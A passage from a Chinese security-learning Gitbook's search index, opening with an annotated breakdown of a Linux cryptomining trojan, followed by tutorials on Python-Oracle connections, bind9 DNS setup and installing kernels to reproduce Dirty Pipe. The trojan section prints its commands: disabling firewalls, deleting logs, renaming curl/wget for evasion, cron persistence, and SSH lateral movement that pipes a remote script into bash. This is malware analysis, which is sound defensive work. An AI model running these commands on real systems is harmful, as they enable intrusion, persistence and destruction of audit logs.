> /etc/sysconfig/selinux 2>/dev/null 将缓存数据同步刷新到磁盘并手动释放缓存 sync && echo 3 >/proc/sys/vm/drop_caches Tips echo 1 >/proc/sys/vm/drop_caches 释放 pagecache echo 2 >/proc/sys/vm/drop_caches 释放 pagecache, dentries and inodes echo 3 >/proc/sys/vm/drop_caches 释放上述二者 创建 /etc/svcupdates，后续据此判断是否具有root权限 echo 1 > /etc/svcupdates 重命名 curl/wget（免杀） mv /usr/bin/curl /usr/bin/url mv /usr/bin/url /usr/bin/cd1 mv /usr/bin/wget /usr/bin/get mv /usr/bin/get /usr/bin/wd1 设置进程打开的文件句柄最大限制 ulimit -n 65535 删除syslog rm -rf /var/log/syslog 修改 tmp目录属性 chattr -iua /tmp/ chattr -iua /var/tmp/ Tips a: 只能添加 i: 不可移动 u: 不可删除 +: 添加属性 -: 删除属性 关闭ufw ufw disable 关闭iptables iptables -F 关闭 nmi watchdog echo '0' >/proc/sys/kernel/nmi_watchdog echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf Tips nmi watchdog: 监测内核中断并执行操作，如重启 删除竞品木马及挖矿文件 userdel akay userdel vfinder rm -rf /tmp/addres* rm -rf /tmp/walle* rm -rf /tmp/keys 删除云防护产品（阿里云防护，腾讯云镜） 删除竞品木马及挖矿程序 如果当前权限是root，则在/etc目录执行木马及挖矿，否则在/tmp目录进行 if [ -f \"$rtdir\" ] 木马运行加入定时任务 unlock_cron echo \"*/30 * * * * sh /etc/newsvc.sh >/dev/null 2>&1\" >> ${crondir} lock_cron 内网横移 if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then for h in $(grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o- http://*.*.*.*/b2f628fff19fda999999999/is.sh | bash >/dev/null 2>&1 &' & done fi Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-09 18:45:35 "},"安全开发/":{"url":"安全开发/","title":"安全开发","keywords":"","body":"安全开发安全开发 本模块介绍安全开发相关的知识，不会开发的安全研究员不是最好的，一起开发起来！ Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-10 09:40:48 "},"安全开发/Ubuntu18使用Python连接Oracle数据库.html":{"url":"安全开发/Ubuntu18使用Python连接Oracle数据库.html","title":"Ubuntu18使用Python连接Oracle数据库","keywords":"","body":"Ubuntu18使用Python连接Oracle数据库启动oracle数据库安装基础环境安装 instantclientsqlplus连接python 连接Ubuntu18使用Python连接Oracle数据库 [原创] 启动oracle数据库 docker pull vultarget/oracle-12c-defineownpwd:latest docker run -d -p 1521:1521 -e DBCA_TOTAL_MEMORY=2048 vultarget/oracle-12c-defineownpwd:latest 安装基础环境 安装alien apt-get install alien 安装依赖 apt-get install libaio1 libaio-dev 安装 instantclient https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html 下载 oracle-instantclient19.13-basic-19.13.0.0.0-1.x86_64.rpm oracle-instantclient19.13-devel-19.13.0.0.0-1.x86_64.rpm oracle-instantclient19.13-sqlplus-19.13.0.0.0-1.x86_64.rpm P.S. 小版本可能会有差异 安装 alien -i oracle-instantclient19.13-basic-19.13.0.0.0-1.x86_64.rpm alien -i oracle-instantclient19.13-devel-19.13.0.0.0-1.x86_64.rpm alien -i oracle-instantclient19.13-sqlplus-19.13.0.0.0-1.x86_64.rpm 配置环境变量 vim /etc/profile 写入 export ORACLE_HOME=\"/usr/lib/oracle/19.13/client64\" export ORACLE_SID=\"xe\" export TNS_ADMIN=\"$ORACLE_HOME/network/admin\" export LD_LIBRARY_PATH=\"$ORACLE_HOME/lib\" export PATH=\"$ORACLE_HOME/bin:$PATH\" P.S. 注意版本和sid，根据oracle实际情况填写 配置tnsnames.ora cd /usr/lib/oracle/19.13/client64 mkdir -p network/admin cd network/admin && vim tnsnames.ora XE = (DESCRIPTION = (ADDRESS_LIST = (ADDRESS = (PROTOCOL = TCP)(HOST = 127.0.0.1)(PORT = 1521)) ) (CONNECT_DATA = (SERVICE_NAME = xe) ) ) 保存 sqlplus连接 sqlplus 用户名/密码@XE python 连接 https://pypi.org/project/cx-Oracle/5.3/#files 下载后，安装 测试脚本： import cx_Oracle as cx import os os.environ['NLS_LANG'] = 'SIMPLIFIED CHINESE_CHINA.UTF8' if __name__ == '__main__': con = cx.connect('system', 'xxxxxx', '127.0.0.1:1521/xe') cursor = con.cursor() cursor.execute(\"select 123 from dual\") data = cursor.fetchone() print(data) cursor.close() con.close() Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-04 10:39:30 "},"环境搭建/":{"url":"环境搭建/","title":"环境搭建","keywords":"","body":"环境搭建环境搭建 本模块介绍环境搭建相关的知识和总结，为了避免再次踩坑 Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-04 10:36:35 "},"环境搭建/Ubuntu搭建DNS服务器.html":{"url":"环境搭建/Ubuntu搭建DNS服务器.html","title":"Ubuntu搭建DNS服务器","keywords":"","body":"Ubuntu 搭建DNS服务器安装DNS服务器（bind9）配置 /etc/bind/named.conf.options配置 /etc/bind/named.conf.local 文件配置 /var/cache/bind/test.cn重启bind9Ubuntu 搭建DNS服务器 [原创] 安装DNS服务器（bind9） apt install bind9 配置 /etc/bind/named.conf.options named.conf.options 文件中包含一些基本的配置，比如定义 解析 文件的位置（directory）、DNS 上游服务器（forwarders）、以及一些安全相关的参数配置等 options { // 这个目录决定了我们域名解析数据配置的目录，记住这个目录，后面会用到 directory \"/var/cache/bind\"; // 配置 bind9 上游的 DNS 服务器 // 如果 bind9 中找不到某个域名的解析，会把域名解析请求发送到上游 DNS 服务器 // 192.168.8.1 这个是我家里的路由器的 IP，这个路由器提供了 DNS 服务能力 forwarders { 192.168.8.1; }; allow-query { 0.0.0.0/0; }; // 因为 192.168.8.1 是本地路由器，安全性不是很高 // 需要关闭下面这几个安全相关参数才可以使用 dnssec-enable no; dnssec-validation no; dnssec-lookaside auto; auth-nxdomain no; # conform to RFC1035 listen-on-v6 { any; }; }; 配置 /etc/bind/named.conf.local 文件 可以在 named.conf.local 文件中添加自定义的域名信息（zone）以及相应的解析文件（file）。 // 这里定义在 bind9 中添加 test.cn 解析 zone \"test.cn\"{ type master; // 这里定义了在哪个文件中配置了 IP 信息 file \"test.cn\"; }; 配置 /var/cache/bind/test.cn ① /etc/bind/named.conf.options 中的 directory ② /etc/bind/named.conf.local 中的 file 共同指定了 test.cn 的域名解析记录包含在 /var/cache/bind/test.cn 文件 $TTL 604800 @ IN SOA localhost. root.localhost. ( 2 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; 假设在 192.168.8.12 中搭建了某个服务，并希望以 test.cn 暴露出去 @ IN NS localhost. @ IN A 192.168.8.12 重启bind9 # 重新载入配置 sudo systemctl daemon-reload # 重启 bind9 sudo systemctl restart bind9.service Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-09 09:56:24 "},"环境搭建/提权漏洞怎么测试-安装一些其他版本的内核.html":{"url":"环境搭建/提权漏洞怎么测试-安装一些其他版本的内核.html","title":"提权漏洞怎么测试-安装一些其他版本的内核","keywords":"","body":"提权漏洞怎么测试？安装一些其他版本的内核提权漏洞怎么测试？方法也很简单参考链接提权漏洞怎么测试？安装一些其他版本的内核 [原创] 提权漏洞怎么测试？ 如果提权漏洞和内核版本有关，就需要安装一些其他版本的内核。 比如Dirty Pipe提权（CVE-2022-0847），其要求内核是5.8以上的才能利用，而我们手里的内核可能没有这么高，想要复现漏洞需要安装高版本内核。 方法也很简单 以Ubuntu 20.04为例，默认内核版本是5.4，我们需要安装5.8的内核。 首先访问 https://kernel.ubuntu.com/~kernel-ppa/mainline/ 在其中找到你想要的版本，比如5.8.5，然后下载两个deb文件： amd64/linux-modules-5.8.5-050805-generic_5.8.5-050805.202008270831_amd64.deb amd64/linux-image-unsigned-5.8.5-050805-generic_5.8.5-050805.202008270831_amd64.deb 然后使用dpkg -i安装这两个文件（图2）： dpkg -i linux-*.deb 安装成功后，更新grub系统引导并重启： update-grub reboot 再使用uname -a查看内核版本就已经是5.8.5了，如图3。 然后再测试Dirty Pipe，图4，很稳。 参考链接 https://dirtypipe.cm4all.com/ https://haxx.in/files/dirtypipez.c Copyright © 2022 WeLearn. All rights reserved. all right reserved，powered by Gitbook文章最后修改于 2022-04-09 19:53:51 "}}